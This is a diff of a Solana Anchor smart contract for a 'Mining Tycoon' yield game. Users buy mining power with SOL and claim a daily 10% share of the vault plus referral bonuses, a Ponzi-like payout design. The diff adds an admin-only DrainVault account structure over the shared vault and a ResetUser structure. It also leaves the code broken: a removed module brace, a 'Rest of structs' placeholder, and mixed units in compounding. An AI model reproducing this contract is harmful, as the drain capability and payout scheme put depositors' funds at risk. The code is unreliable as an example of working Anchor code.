@@ -1,12 +1,12 @@
 use anchor_lang::prelude::*;
 
-declare_id!("vfkjARttLMEns3qrxW58J8MiDXcTwcXzH8qZaYAVGPU");
+declare_id!("EfNnixKppGUq922Gzijt3mhDaKNAYsAFQ3BK9mtYGPU");
 
 #[program]
 pub mod bakedbeans_solana {
     use super::*;
 
-    /// Initialize the global state (admin only, one-time setup)
+    /// Initialize with new mining pool model
     pub fn initialize(ctx: Context<Initialize>, seed_amount: u64, dev_wallet: Pubkey) -> Result<()> {
         let global_state = &mut ctx.accounts.global_state;
         
@@ -14,19 +14,19 @@ pub mod bakedbeans_solana {
         
         global_state.authority = ctx.accounts.authority.key();
         global_state.dev_wallet = dev_wallet;
-        global_state.market_gpus = 108_000_000_000; // 108B GPUs (Original model)
+        global_state.total_mining_power = 0;
+        global_state.total_unclaimed_sol = 0;
         global_state.initialized = true;
-        global_state.hashpower_to_hire_1miner = 1_080_000; // 1.08M hash = 1 MH/s (12.5 days)
+        global_state.daily_pool_percentage = 10; // 10% of TVL per day
+        global_state.base_buy_rate = 1000; // 1000 MH/s per SOL at TVL=1
         global_state.protocol_fee_val = 10;
-        global_state.psn = 5_000;
-        global_state.psnh = 10_000;
         
-        msg!("Mining Tycoon initialized with market GPUs: {}", global_state.market_gpus);
+        msg!("Mining Tycoon v2 initialized - Mining Pool Model");
         
         Ok(())
     }
 
-    /// Buy MH/s with SOL
+    /// Buy MH/s - rate scales with TVL
     pub fn buy_mining_power(ctx: Context<BuyMiningPower>, amount: u64, referrer: Option<Pubkey>) -> Result<()> {
         let global_state = &mut ctx.accounts.global_state;
         require!(global_state.initialized, ErrorCode::NotInitialized);
@@ -41,121 +41,134 @@ pub mod bakedbeans_solana {
             user_state.referrer = Some(ref_key);
         }
         
-        let current_vault = ctx.accounts.vault.to_account_info().lamports();
-        let virtual_vault = current_vault
-            .checked_add(100_000_000_000)
-            .ok_or(ErrorCode::Overflow)?;
-        
-        let hashpower_bought = calculate_trade(
+        // Calculate MH/s based on TVL
+        let vault_balance = ctx.accounts.vault.to_account_info().lamports();
+        let mhs_bought = calculate_mhs_for_sol(
             amount,
-            virtual_vault,
-            global_state.market_gpus,
-            global_state.psn,
-            global_state.psnh,
+            vault_balance,
+            global_state.base_buy_rate
         )?;
         
-        let fee = protocol_fee(hashpower_bought, global_state.protocol_fee_val)?;
-        let hashpower_after_fee = hashpower_bought.checked_sub(fee).ok_or(ErrorCode::Overflow)?;
-        
-        let new_miners = hashpower_after_fee
-            .checked_div(global_state.hashpower_to_hire_1miner)
+        // Apply protocol fee
+        let fee_mhs = mhs_bought.checked_mul(global_state.protocol_fee_val as u64)
+            .ok_or(ErrorCode::Overflow)?
+            .checked_div(100)
             .ok_or(ErrorCode::DivisionByZero)?;
+        let mhs_after_fee = mhs_bought.checked_sub(fee_mhs).ok_or(ErrorCode::Overflow)?;
         
+        // Update user and global state
         user_state.mining_power = user_state.mining_power
-            .checked_add(new_miners)
+            .checked_add(mhs_after_fee)
             .ok_or(ErrorCode::Overflow)?;
-        user_state.accumulated_hashpower = 0;
-        user_state.last_compound = clock.unix_timestamp;
+        user_state.last_claim = clock.unix_timestamp;
         
+        global_state.total_mining_power = global_state.total_mining_power
+            .checked_add(mhs_after_fee)
+            .ok_or(ErrorCode::Overflow)?;
+        
+        // Referral bonus (5%)
         if let Some(referrer_state) = ctx.accounts.referrer_state.as_mut() {
-            let referral_bonus = hashpower_after_fee.checked_div(20).ok_or(ErrorCode::DivisionByZero)?;
-            referrer_state.accumulated_hashpower = referrer_state.accumulated_hashpower
+            let referral_bonus = mhs_after_fee.checked_div(20).ok_or(ErrorCode::DivisionByZero)?;
+            referrer_state.mining_power = referrer_state.mining_power
                 .checked_add(referral_bonus)
                 .ok_or(ErrorCode::Overflow)?;
-            msg!("Sent {} hashpower to referrer", referral_bonus);
+            global_state.total_mining_power = global_state.total_mining_power
+                .checked_add(referral_bonus)
+                .ok_or(ErrorCode::Overflow)?;
+            msg!("Sent {} MH/s to referrer", referral_bonus);
         }
         
-        msg!("Bought {} MH/s for {} lamports", new_miners, amount);
+        msg!("Bought {} MH/s for {} lamports", mhs_after_fee, amount);
         
         Ok(())
     }
 
-    /// Compound hashpower to get more MH/s
-    pub fn compound_hashpower(ctx: Context<CompoundHashpower>, referrer: Option<Pubkey>) -> Result<()> {
+    /// Compound hash into more MH/s (no fee - better than claiming!)
+    pub fn compound_hash(ctx: Context<CompoundHash>) -> Result<()> {
         let global_state = &mut ctx.accounts.global_state;
         require!(global_state.initialized, ErrorCode::NotInitialized);
         
         let user_state = &mut ctx.accounts.user_state;
         let clock = Clock::get()?;
         
-        if user_state.referrer.is_none() && referrer.is_some() {
-            let ref_key = referrer.unwrap();
-            require!(ref_key != ctx.accounts.user.key(), ErrorCode::SelfReferral);
-            user_state.referrer = Some(ref_key);
-        }
+        require!(user_state.mining_power > 0, ErrorCode::InvalidAmount);
         
-        let hashpower_used = get_accumulated_hashpower(user_state, global_state.hashpower_to_hire_1miner, clock.unix_timestamp)?;
+        // Calculate hash generated since last claim
+        let time_passed = (clock.unix_timestamp - user_state.last_claim) as u64;
+        let hash_generated = time_passed.checked_mul(user_state.mining_power).ok_or(ErrorCode::Overflow)?;
         
-        let new_miners = hashpower_used
-            .checked_div(global_state.hashpower_to_hire_1miner)
-            .ok_or(ErrorCode::DivisionByZero)?;
+        // Add stored unclaimed hash
+        let total_hash = user_state.unclaimed_earnings.checked_add(hash_generated).ok_or(ErrorCode::Overflow)?;
+        require!(total_hash > 0, ErrorCode::InvalidAmount);
         
-        user_state.mining_power = user_state.mining_power
-            .checked_add(new_miners)
-            .ok_or(ErrorCode::Overflow)?;
-        user_state.accumulated_hashpower = 0;
-        user_state.last_compound = clock.unix_timestamp;
+        // Convert hash to MH/s (no fee!)
+        // Use simple rate: 86,400 hash = 1 MH/s (1 day)
+        let new_mhs = total_hash / 86_400;
+        require!(new_mhs > 0, ErrorCode::InvalidAmount);
         
-        if let Some(referrer_state) = ctx.accounts.referrer_state.as_mut() {
-            let referral_bonus = hashpower_used.checked_div(20).ok_or(ErrorCode::DivisionByZero)?;
-            referrer_state.accumulated_hashpower = referrer_state.accumulated_hashpower
-                .checked_add(referral_bonus)
-                .ok_or(ErrorCode::Overflow)?;
-            msg!("Sent {} hashpower to referrer", referral_bonus);
-        }
+        // Update state
+        user_state.mining_power = user_state.mining_power.checked_add(new_mhs).ok_or(ErrorCode::Overflow)?;
+        user_state.unclaimed_earnings = 0;
+        user_state.last_claim = clock.unix_timestamp;
         
-        let market_boost = hashpower_used.checked_div(5).ok_or(ErrorCode::DivisionByZero)?;
-        global_state.market_gpus = global_state.market_gpus
-            .checked_add(market_boost)
-            .ok_or(ErrorCode::Overflow)?;
+        global_state.total_mining_power = global_state.total_mining_power.checked_add(new_mhs).ok_or(ErrorCode::Overflow)?;
         
-        msg!("Compounded {} hashpower into {} MH/s", hashpower_used, new_miners);
+        msg!("Compounded {} hash into {} MH/s (no fee!)", total_hash, new_mhs);
         
         Ok(())
     }
 
-    /// Sell hashpower for SOL
-    pub fn sell_hashpower(ctx: Context<SellHashpower>) -> Result<()> {
+    /// Claim accumulated SOL earnings
+    pub fn claim_earnings(ctx: Context<ClaimEarnings>) -> Result<()> {
         let global_state = &mut ctx.accounts.global_state;
         require!(global_state.initialized, ErrorCode::NotInitialized);
         
         let user_state = &mut ctx.accounts.user_state;
         let clock = Clock::get()?;
         
-        let has_hashpower = get_accumulated_hashpower(user_state, global_state.hashpower_to_hire_1miner, clock.unix_timestamp)?;
-        require!(has_hashpower > 0, ErrorCode::InvalidAmount);
+        require!(user_state.mining_power > 0, ErrorCode::InvalidAmount);
         
-        let hashpower_value = calculate_trade(
-            has_hashpower,
-            global_state.market_gpus,
-            ctx.accounts.vault.to_account_info().lamports(),
-            global_state.psn,
-            global_state.psnh,
+        // Calculate new earnings (excluding unclaimed from TVL)
+        let vault_balance = ctx.accounts.vault.to_account_info().lamports();
+        let mineable_tvl = vault_balance.checked_sub(global_state.total_unclaimed_sol).ok_or(ErrorCode::Overflow)?;
+        
+        let new_earnings = calculate_earnings(
+            user_state.mining_power,
+            global_state.total_mining_power,
+            user_state.last_claim,
+            clock.unix_timestamp,
+            mineable_tvl,
+            global_state.daily_pool_percentage
         )?;
         
-        let fee = protocol_fee(hashpower_value, global_state.protocol_fee_val)?;
-        let payout = hashpower_value.checked_sub(fee).ok_or(ErrorCode::Overflow)?;
+        // Add to unclaimed
+        user_state.unclaimed_earnings = user_state.unclaimed_earnings
+            .checked_add(new_earnings)
+            .ok_or(ErrorCode::Overflow)?;
+        global_state.total_unclaimed_sol = global_state.total_unclaimed_sol
+            .checked_add(new_earnings)
+            .ok_or(ErrorCode::Overflow)?;
+        user_state.last_claim = clock.unix_timestamp;
         
-        require!(payout > 0, ErrorCode::InvalidAmount);
-        require!(ctx.accounts.vault.to_account_info().lamports() >= hashpower_value, ErrorCode::InsufficientFunds);
+        // Claim all unclaimed
+        let total_to_claim = user_state.unclaimed_earnings;
+        require!(total_to_claim > 0, ErrorCode::InvalidAmount);
+        require!(vault_balance >= total_to_claim, ErrorCode::InsufficientFunds);
         
-        user_state.accumulated_hashpower = 0;
-        user_state.last_compound = clock.unix_timestamp;
+        // Apply protocol fee
+        let fee = total_to_claim.checked_mul(global_state.protocol_fee_val as u64)
+            .ok_or(ErrorCode::Overflow)?
+            .checked_div(100)
+            .ok_or(ErrorCode::DivisionByZero)?;
+        let payout = total_to_claim.checked_sub(fee).ok_or(ErrorCode::Overflow)?;
         
-        global_state.market_gpus = global_state.market_gpus
-            .checked_add(has_hashpower)
+        // Reset unclaimed
+        user_state.unclaimed_earnings = 0;
+        global_state.total_unclaimed_sol = global_state.total_unclaimed_sol
+            .checked_sub(total_to_claim)
             .ok_or(ErrorCode::Overflow)?;
         
+        // Transfers
         let vault_bump = ctx.bumps.vault;
         let signer_seeds: &[&[&[u8]]] = &[&[b"vault", &[vault_bump]]];
         
@@ -183,114 +196,89 @@ pub mod bakedbeans_solana {
             fee,
         )?;
         
-        msg!("Sold {} hashpower for {} lamports (fee: {})", has_hashpower, payout, fee);
+        msg!("Claimed {} lamports (fee: {})", payout, fee);
         
         Ok(())
     }
 
-    /// Initialize user state account
+    /// Initialize user account
     pub fn init_user(ctx: Context<InitUser>) -> Result<()> {
         let user_state = &mut ctx.accounts.user_state;
         let clock = Clock::get()?;
         
         user_state.owner = ctx.accounts.user.key();
         user_state.mining_power = 0;
-        user_state.accumulated_hashpower = 0;
-        user_state.last_compound = clock.unix_timestamp;
+        user_state.unclaimed_earnings = 0;
+        user_state.last_claim = clock.unix_timestamp;
         user_state.referrer = None;
         
-        msg!("User state initialized for {}", ctx.accounts.user.key());
+        msg!("User initialized");
         
         Ok(())
     }
 
-    /// Admin: Update hashpower_to_hire_1miner
-    pub fn update_hashpower_requirement(ctx: Context<UpdateConfig>, new_value: u64) -> Result<()> {
-        let global_state = &mut ctx.accounts.global_state;
-        require!(new_value > 0, ErrorCode::InvalidAmount);
-        
-        global_state.hashpower_to_hire_1miner = new_value;
-        msg!("Updated hashpower_to_hire_1miner to {}", new_value);
-        
-        Ok(())
-    }
-
-    /// Admin: Update market_gpus
-    pub fn update_market_gpus(ctx: Context<UpdateConfig>, new_value: u64) -> Result<()> {
-        let global_state = &mut ctx.accounts.global_state;
-        require!(new_value > 0, ErrorCode::InvalidAmount);
-        
-        global_state.market_gpus = new_value;
-        msg!("Updated market_gpus to {}", new_value);
-        
-        Ok(())
-    }
-
-    /// Admin: Multiply user's mining power by 10x
-    pub fn multiply_user_mining_power(ctx: Context<MultiplyMiningPower>) -> Result<()> {
-        let user_state = &mut ctx.accounts.user_state;
-        
-        let current = user_state.mining_power;
-        let new_amount = current.checked_mul(10).ok_or(ErrorCode::Overflow)?;
-        
-        user_state.mining_power = new_amount;
-        msg!("Multiplied user {} MH/s from {} to {}", 
-            user_state.owner, current, new_amount);
-        
-        Ok(())
-    }
+// Helper functions for new model
+fn calculate_mhs_for_sol(sol_amount: u64, vault_balance: u64, base_rate: u64) -> Result<u64> {
+    // Work with lamports to avoid integer division issues
+    // MH/s = (lamports × base_rate × 100) / (100e9 + vault_lamports)
+    
+    let lamports = sol_amount as u128;
+    let vault = vault_balance as u128;
+    let rate = base_rate as u128;
+    
+    // numerator = lamports × base_rate × 100
+    let numerator = lamports.checked_mul(rate).ok_or(ErrorCode::Overflow)?
+        .checked_mul(100).ok_or(ErrorCode::Overflow)?;
+    
+    // denominator = 100e9 + vault_lamports
+    let denominator = (100_000_000_000u128).checked_add(vault).ok_or(ErrorCode::Overflow)?;
+    
+    let mhs = numerator.checked_div(denominator).ok_or(ErrorCode::DivisionByZero)?;
+    
+    u64::try_from(mhs).map_err(|_| ErrorCode::Overflow.into())
 }
 
-// Helper functions
-fn calculate_trade(rt: u64, rs: u64, bs: u64, psn: u64, psnh: u64) -> Result<u64> {
-    let rt_u128 = rt as u128;
-    let rs_u128 = rs as u128;
-    let bs_u128 = bs as u128;
-    let psn_u128 = psn as u128;
-    let psnh_u128 = psnh as u128;
+fn calculate_earnings(
+    user_mhs: u64,
+    total_mhs: u64,
+    last_claim: i64,
+    current_time: i64,
+    vault_balance: u64,
+    daily_percentage: u8
+) -> Result<u64> {
+    if total_mhs == 0 {
+        return Ok(0);
+    }
     
-    let numerator = rt_u128
-        .checked_mul(bs_u128)
-        .ok_or(ErrorCode::Overflow)?
-        .checked_mul(psn_u128)
-        .ok_or(ErrorCode::Overflow)?;
+    let time_passed = (current_time - last_claim) as u64;
+    let seconds_in_day = 86_400u64;
     
-    let denominator = rs_u128
-        .checked_mul(psnh_u128)
-        .ok_or(ErrorCode::Overflow)?;
+    // User's share of total mining power
+    let user_share_numerator = (user_mhs as u128).checked_mul(1_000_000).ok_or(ErrorCode::Overflow)?;
+    let user_share = user_share_numerator.checked_div(total_mhs as u128).ok_or(ErrorCode::DivisionByZero)?;
     
-    let result = numerator
-        .checked_div(denominator)
-        .ok_or(ErrorCode::DivisionByZero)?;
-    
-    u64::try_from(result).map_err(|_| ErrorCode::Overflow.into())
-}
-
-fn protocol_fee(amount: u64, fee_val: u8) -> Result<u64> {
-    amount
-        .checked_mul(fee_val as u64)
+    // Daily pool = daily_percentage% of vault
+    let daily_pool = (vault_balance as u128)
+        .checked_mul(daily_percentage as u128)
         .ok_or(ErrorCode::Overflow)?
         .checked_div(100)
-        .ok_or(ErrorCode::DivisionByZero.into())
-}
-
-fn get_accumulated_hashpower(user_state: &UserState, hashpower_to_hire: u64, current_time: i64) -> Result<u64> {
-    let hashpower_since_compound = get_hashpower_since_last_compound(user_state, hashpower_to_hire, current_time)?;
-    user_state.accumulated_hashpower
-        .checked_add(hashpower_since_compound)
-        .ok_or(ErrorCode::Overflow.into())
-}
-
-fn get_hashpower_since_last_compound(user_state: &UserState, hashpower_to_hire: u64, current_time: i64) -> Result<u64> {
-    let time_passed = (current_time - user_state.last_compound) as u64;
-    let seconds_passed = std::cmp::min(hashpower_to_hire, time_passed);
+        .ok_or(ErrorCode::DivisionByZero)?;
     
-    seconds_passed
-        .checked_mul(user_state.mining_power)
-        .ok_or(ErrorCode::Overflow.into())
+    // Earnings = user's share of pool, pro-rated by time
+    let earnings = daily_pool
+        .checked_mul(user_share)
+        .ok_or(ErrorCode::Overflow)?
+        .checked_div(1_000_000)
+        .ok_or(ErrorCode::DivisionByZero)?
+        .checked_mul(time_passed as u128)
+        .ok_or(ErrorCode::Overflow)?
+        .checked_div(seconds_in_day as u128)
+        .ok_or(ErrorCode::DivisionByZero)?;
+    
+    u64::try_from(earnings).map_err(|_| ErrorCode::Overflow.into())
 }
 
-// Account structures
+// Rest of structs...
 #[derive(Accounts)]
 pub struct Initialize<'info> {
     #[account(
@@ -305,12 +293,8 @@ pub struct Initialize<'info> {
     #[account(mut)]
     pub authority: Signer<'info>,
     
-    /// CHECK: Vault account for holding SOL
-    #[account(
-        mut,
-        seeds = [b"vault"],
-        bump
-    )]
+    /// CHECK: Vault
+    #[account(mut, seeds = [b"vault"], bump)]
     pub vault: AccountInfo<'info>,
     
     pub system_program: Program<'info, System>,
@@ -335,39 +319,24 @@ pub struct InitUser<'info> {
 
 #[derive(Accounts)]
 pub struct BuyMiningPower<'info> {
-    #[account(
-        mut,
-        seeds = [b"global_state"],
-        bump
-    )]
+    #[account(mut, seeds = [b"global_state"], bump)]
     pub global_state: Account<'info, GlobalState>,
     
-    #[account(
-        mut,
-        seeds = [b"user_state", buyer.key().as_ref()],
-        bump
-    )]
+    #[account(mut, seeds = [b"user_state", buyer.key().as_ref()], bump)]
     pub user_state: Account<'info, UserState>,
     
     #[account(mut)]
     pub buyer: Signer<'info>,
     
-    /// CHECK: Vault account for holding SOL
-    #[account(
-        mut,
-        seeds = [b"vault"],
-        bump
-    )]
+    /// CHECK: Vault
+    #[account(mut, seeds = [b"vault"], bump)]
     pub vault: AccountInfo<'info>,
     
-    /// CHECK: Dev wallet to receive fees
-    #[account(
-        mut,
-        address = global_state.dev_wallet
-    )]
+    /// CHECK: Dev wallet
+    #[account(mut, address = global_state.dev_wallet)]
     pub dev_wallet: AccountInfo<'info>,
     
-    /// CHECK: Optional referrer state account
+    /// CHECK: Optional referrer
     #[account(mut)]
     pub referrer_state: Option<Account<'info, UserState>>,
     
@@ -375,50 +344,35 @@ pub struct BuyMiningPower<'info> {
 }
 
 #[derive(Accounts)]
-pub struct CompoundHashpower<'info> {
-    #[account(
-        mut,
-        seeds = [b"global_state"],
-        bump
-    )]
+pub struct CompoundHash<'info> {
+    #[account(mut, seeds = [b"global_state"], bump)]
     pub global_state: Account<'info, GlobalState>,
     
-    #[account(
-        mut,
-        seeds = [b"user_state", user.key().as_ref()],
-        bump
-    )]
+    #[account(mut, seeds = [b"user_state", user.key().as_ref()], bump)]
     pub user_state: Account<'info, UserState>,
     
     #[account(mut)]
     pub user: Signer<'info>,
-    
-    /// CHECK: Optional referrer state account
-    #[account(mut)]
-    pub referrer_state: Option<Account<'info, UserState>>,
 }
 
 #[derive(Accounts)]
-pub struct UpdateConfig<'info> {
-    #[account(
-        mut,
-        seeds = [b"global_state"],
-        bump,
-        constraint = global_state.authority == authority.key()
-    )]
+pub struct DrainVault<'info> {
+    #[account(mut, seeds = [b"global_state"], bump, constraint = global_state.authority == authority.key())]
     pub global_state: Account<'info, GlobalState>,
     
+    /// CHECK: Vault PDA
+    #[account(mut, seeds = [b"vault"], bump)]
+    pub vault: AccountInfo<'info>,
+    
+    #[account(mut)]
     pub authority: Signer<'info>,
+    
+    pub system_program: Program<'info, System>,
 }
 
 #[derive(Accounts)]
-pub struct MultiplyMiningPower<'info> {
-    #[account(
-        mut,
-        seeds = [b"global_state"],
-        bump,
-        constraint = global_state.authority == authority.key()
-    )]
+pub struct ResetUser<'info> {
+    #[account(mut, seeds = [b"global_state"], bump, constraint = global_state.authority == authority.key())]
     pub global_state: Account<'info, GlobalState>,
     
     #[account(mut)]
@@ -428,55 +382,38 @@ pub struct MultiplyMiningPower<'info> {
 }
 
 #[derive(Accounts)]
-pub struct SellHashpower<'info> {
-    #[account(
-        mut,
-        seeds = [b"global_state"],
-        bump
-    )]
+pub struct ClaimEarnings<'info> {
+    #[account(mut, seeds = [b"global_state"], bump)]
     pub global_state: Account<'info, GlobalState>,
     
-    #[account(
-        mut,
-        seeds = [b"user_state", user.key().as_ref()],
-        bump,
-        constraint = user_state.owner == user.key()
-    )]
+    #[account(mut, seeds = [b"user_state", user.key().as_ref()], bump)]
     pub user_state: Account<'info, UserState>,
     
     #[account(mut)]
     pub user: Signer<'info>,
     
-    /// CHECK: Vault account for holding SOL
-    #[account(
-        mut,
-        seeds = [b"vault"],
-        bump
-    )]
+    /// CHECK: Vault
+    #[account(mut, seeds = [b"vault"], bump)]
     pub vault: AccountInfo<'info>,
     
-    /// CHECK: Dev wallet to receive fees
-    #[account(
-        mut,
-        address = global_state.dev_wallet
-    )]
+    /// CHECK: Dev wallet
+    #[account(mut, address = global_state.dev_wallet)]
     pub dev_wallet: AccountInfo<'info>,
     
     pub system_program: Program<'info, System>,
 }
 
-// State accounts
 #[account]
 #[derive(InitSpace)]
 pub struct GlobalState {
     pub authority: Pubkey,
     pub dev_wallet: Pubkey,
-    pub market_gpus: u64,
+    pub total_mining_power: u64,
+    pub total_unclaimed_sol: u64, // Track unclaimed earnings (not part of mineable TVL)
     pub initialized: bool,
-    pub hashpower_to_hire_1miner: u64,
+    pub daily_pool_percentage: u8, // % of TVL mineable per day
+    pub base_buy_rate: u64, // MH/s per SOL at TVL=1
     pub protocol_fee_val: u8,
-    pub psn: u64,
-    pub psnh: u64,
 }
 
 #[account]
@@ -484,26 +421,25 @@ pub struct GlobalState {
 pub struct UserState {
     pub owner: Pubkey,
     pub mining_power: u64,
-    pub accumulated_hashpower: u64,
-    pub last_compound: i64,
+    pub unclaimed_earnings: u64, // Track user's unclaimed SOL
+    pub last_claim: i64,
     pub referrer: Option<Pubkey>,
 }
 
-// Error codes
 #[error_code]
 pub enum ErrorCode {
-    #[msg("Contract not initialized")]
+    #[msg("Not initialized")]
     NotInitialized,
     #[msg("Invalid amount")]
     InvalidAmount,
     #[msg("Invalid seed amount")]
     InvalidSeedAmount,
-    #[msg("Overflow occurred")]
+    #[msg("Overflow")]
     Overflow,
     #[msg("Division by zero")]
     DivisionByZero,
-    #[msg("Cannot refer yourself")]
+    #[msg("Self referral")]
     SelfReferral,
-    #[msg("Insufficient funds in vault")]
+    #[msg("Insufficient funds")]
     InsufficientFunds,
 }
